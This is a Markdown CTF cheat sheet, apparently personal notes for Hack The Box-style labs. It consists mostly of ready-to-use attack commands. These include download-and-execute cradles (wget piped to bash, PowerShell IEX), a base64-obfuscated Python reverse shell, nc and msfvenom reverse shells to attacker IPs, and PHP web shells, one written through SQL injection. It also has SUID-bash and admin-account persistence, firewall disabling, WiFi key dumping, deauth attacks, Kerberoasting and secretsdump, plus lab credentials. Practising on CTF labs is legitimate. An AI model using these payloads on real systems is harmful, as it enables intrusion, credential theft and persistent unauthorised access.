# CtfCheatsheet
## privesc
### windows
```
wmic qfe
systeminfo
cmdkey /list
whoami /all
wmic logicaldisk get name
get-process
winpeas.exeFwifi
powerup.ps1 invoke-allchecks
dir \ /s/b | find ""
findstr /sp administrator *
Get-ChildItem -Recurse -File | ForEach-Object { try { Get-Content $_.FullName -TotalCount 1 -ErrorAction Stop >$null; $_ } catch {} }
```
### linux
```
sudo -l
linpeas
pspy64
find / -type f -newermt "2019-05-05" ! -newermt "2019-05-26" -ls 2>/dev/null
grep -R -i passwd,password,db_passwd,db_pass
export PATH=.:$PATH
```
### Network recon
```
for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
(for /L %a IN (1,1,254) DO ping /n 1 /w 3 192.168.2.%a) | find "Reply"
Resolve-DnsName -Name 172.16.6.50
./portqry.exe -n 172.16.6.50 -r 1:1024 | find ": LISTENING"
$Target = "172.16.6.50"; 1..1024 | ForEach-Object { try { $c = New-Object System.Net.Sockets.TcpClient; $c.Connect($Target,$_); if ($c.Connected) { "$_ open" }; $c.Close() } catch {} }
```
## reverseshell
  ```
  wget -O - 10.10.14.6/shell.sh | bash
  ```
## Kerberoastable accounts
  ```
  non-empty Service Principal Name (SPN) attribute servicePrincipalName
  ```
## smb
  ```
  net use \\target\$IPC /user:test
  net view \\target /all
  ```
## view errors redirecting STDERR to STDOUT
  ```poweshell
  2>&1
  ```
## FFUF
  ```
  ffuf -w ./SecLists/Discovery/Web-Content/web-extensions.txt -u http://academy.htb/indexFUZZ
  ffuf -w ./SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.sh,.txt,.aspx -u http://10.10.11.175:8530/FUZZ/ -mc all -ic
  ffuf -w ./SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb" -fs
  ffuf -w ./SecLists/Fuzzing/special-chars.txt -u http://10.10.10.70/submit -d "character=bart&quote=FUZZ" -H Content-Type:application/x-www-form-urlencoded -mc all
  ffuf -w .\SecLists\Usernames\xato-net-10-million-usernames.txt -u http://10.10.11.160:5000/login -d "username=FUZZ&password=nidecoña" -H Content-Type:application/x-www-form-urlencoded -mr 'Invalid login'
  ```
## XSS
  ```
  <script src="http://10.10.14.7"></script>
  ```
## Default creds
  ```
  creds search linksys
  ```
## windows lfi
  ```
  /windows/system32/license.rtf
  ```
## RSAT
  ```
  Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online
  ```
## php
  ```
  scandir("/home/dali/.config/psysh")
  file_get_contents("/home/nairobi/ca.key")
  file_put_contents("/home/nairobi/ca.key")
  ```
## wireshark ntlm
  ```
  user::domainname:serverchallenge:NTProofstring:Ntlmv2response
  ```
## git
  ```
  git log
  git diff
  git show
  git branch
  git checkout "branch"
  ```
## ssh
  ```
  echo "public key" > root/.ssh/authorized_keys
  ```
## mssql
  ```
  C:\Windows\System32\runas.exe /netonly /user:ARCHETYPE\sql_svc "C:\Program Files (x86)\Microsoft SQL Server Management Studio 20\Common7\IDE\Ssms.exe"
  ```
## mysql
  ```
  mysql -u user -p
  show databases;
  use database;
  show tables;
  describe table;
  select id from table;
  select * from table \G
  quit
  mysql -u lewis -pP4ntherg0t1n5r3c0n## -D joomla -e "show tables;"
  ```
## sqlmap
  ```
  python3 sqlmap.py --batch --risk 3 --level 5 --technique=BEUSQ --privilege -r ./reqs/tri.req
  sqlmap -r genres.request --second-req feed.request --batch --tamper=space2comment --technique=U --level 5
  ```
## sqlcmd
  ```
  sqlcmd -S sequel.htb -U PublicUser -P GuestUserCantWrite1
  ```
## unionselectshell
  ```
  ' union select "<?php system($_REQUEST['cmd']) ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
  ```
## shell
  ```
  python -c 'import pty; pty.spawn("/bin/bash")'
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  ```
## phpfilter
  ```
  php://filter/convert.base64-encode/resource=index.php
  ```
## transferfiles
  ```
  nc 10.10.14.6 9002 < /usr/local/bin/backup
  nc -lvn 9002 > backup
  ```
## ssh
  ```
  ssh-keygen -f "user"
  ```
## metasploit
  ```
  show info
  use action
  ```
## zone transfer(tcp 53)
  ```
  dig axfr @"ip" dns
  nslookup
    server "ip"
    ls -d ctfolympus.htb
  ```
## port knoking
  ```
  nmap -Pn --max-retries=0 -p 3456,8234,62431 10.10.10.83
  ```
## rdp diferent network
  ```
  ssh -L 9001:target:3389 ubuntu@10.129.252.169
  netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
  ```
## persistence
  ```
  cp /bin/bash /tmp/bash; chmod +s /tmp/bash
    /tmp/bash -p
  net user username password  
  net localgroup Administrators username
  ```
## gci
  ```
  gci -recurse -include *.*
  ```
## remote desktop
  ```
  reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
  netsh advfirewall firewall set rule group="remote desktop" new enable=yes
  NetSh Advfirewall set allprofiles state off
  netsh firewall set opmode disable
  ```
## wget for windows
  ```
  C:\Windows\SysNative\Windowspowershell\v1.0\powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6/winshell.ps1')"
  Invoke-WebRequest "http://10.10.14.7/winpeas.exe" -OutFile "peas.exe"
  (New-Object Net.WebClient).DownloadFile("http://10.10.14.9:8000/reverse.exe","/reverse.exe")
  powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.7/winpeasany.exe', '.\peas.exe')"
  cd \windows\temp & powershell IEX(IWR http://10.10.14.7/winshell.ps1 -UseBasicParsing)
  ```
## mostrascontraseñaswifi
  ```
  for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear | find "clave"
  ```
## pcap2
  ```
  sudo airodum-ng -w file -c 3 --bssid 90:9A:4A:90:9A:4A wlan0
  sudo aireplay-ng --deauth 0 -a 90:9A:4A:90:9A:4A wlan0
  
  ```
## bloodhound
  ```
  ./sharphound.exe -c all -d EGOTISTICAL-BANK.LOCAL --domaincontroller 10.10.10.175  --ldapusername fsmith --ldappassword Thestrokes23
  ```
## Impacket
  ```
  python3 GetNPUsers.py active.htb/ -dc-ip 10.10.10.100 -request
  python3 secretsdump.py support/ldap@10.10.11.174
  Kerberoast
   python3 GetUserSPNs.py support.htb/ldap -dc-ip 10.10.11.174 -request
  ```
## NFS
  ```
  mount -o anon \\192.168.1.3\storage X:
  ```
## ldap
  ```
  ldapsearch -x -H ldap://10.10.10.172 -D '' -w '' -b "DC=megabank,DC=local" -s sub "(objectclass=user)" | grep description,info
  ```
## winrm
  ```
  winrm quickconfig
  winrm set winrm/config/client @{TrustedHosts="10.10.11.202"}
  Set-Item wsman:localhost\client\trustedhosts -Value 192.168.56.105 -Concatenate
  Enter-PSSession -ComputerName 10.10.11.202 -Credential sequel\sql_svc
  $session = New-PSSession -ComputerName 10.10.11.202 -Credential sequel.htb\Ryan.Cooper
  Copy-Item -Recurse "C:\Users\Administrator\Htb\www\winpeasx64.exe" -Destination "C:\Users\Ryan.Cooper\Documents\" -ToSession $Session
  ```  
## phpshell
  ```
  <?php echo "Shell":system($_REQUEST['cmd']); ?>
  ```
## .net
  ```
  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /t:exe /out:Simple_Rev_Shell.exe Simple_Rev_Shell.cs
  ```
## msfvenom
``` 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=9001 -f exe > reverse7.exe
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=9001 -f war > reverse5.war
msfvenom -a x86 --platform Windows -p windows/exec CMD="net user /add lopsy a1234567.;net localgroup administrators lopsy /add" -f dll > cmd.dll
```
## powersploit
  ```
  Set-DomainUserPassword -Identity audit2020 -Domain blackfield.local
  ```
## windows smb server and listening
  ```
  sc config lanmanserver start=demand
  sc stop/start lanmanserver
  ```
## reverseshell eval
  ```
  exec( __import__( "base64" ).b64decode( "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjYiLDkwMDEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw=="))
  ```
## nc.exe
```
\\10.10.14.11\share\nc.exe -e powershell 10.10.14.11 9001
```
## execute command as
  ```
  $password = convertto-securestring -AsPlainText -Force -String "nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz"; 
  $cred = New-Object System.Management.Automation.PSCredential "user",$password; 
  New-PSSession -Credential $cred | Enter-PSSession
  Invoke-Command -Computer support -Credential $cred -ScriptBlock {whoami}
  Invoke-Command -Command {whoami} -Credential $cred -Computer localhost
  Start-Process -FilePath powershell.exe -Credential $cred
  ```
## wpscan
  ```
  wpscan --disable-tls-checks -e u,ap --plugins-detection aggressive --url
  wpscan --password-attack xmlrpc -t 20 -U doug -P .\SecLists\Passwords\Leaked-Databases\rockyou.txt --url
  ```
## signingssl
 ```
 openssl genrsa -out public.key 4096
 openssl req -new -key public.key -out public.csr
 openssl x509 -req -in public.csr -CA ca.crt -CAkey ca.key -set_serial 9001 -extensions client -days 9002 -outform PEM -out public.cer
 openssl pkcs12 -export -inkey public.key -in public.cer -out public.p12
 ```
## tools
  ```
  nmap
  wireshark
  ffuf
  sqlmap
  seclists
  Powersploit
  metasploit
  bloodhound
  crackmapexec
  wpscan
  ghidra
  dnspy
  john
  impacket
  linpeas
  git
  krbrelayx
  gdb-peda-pwndbg-gef
  ```













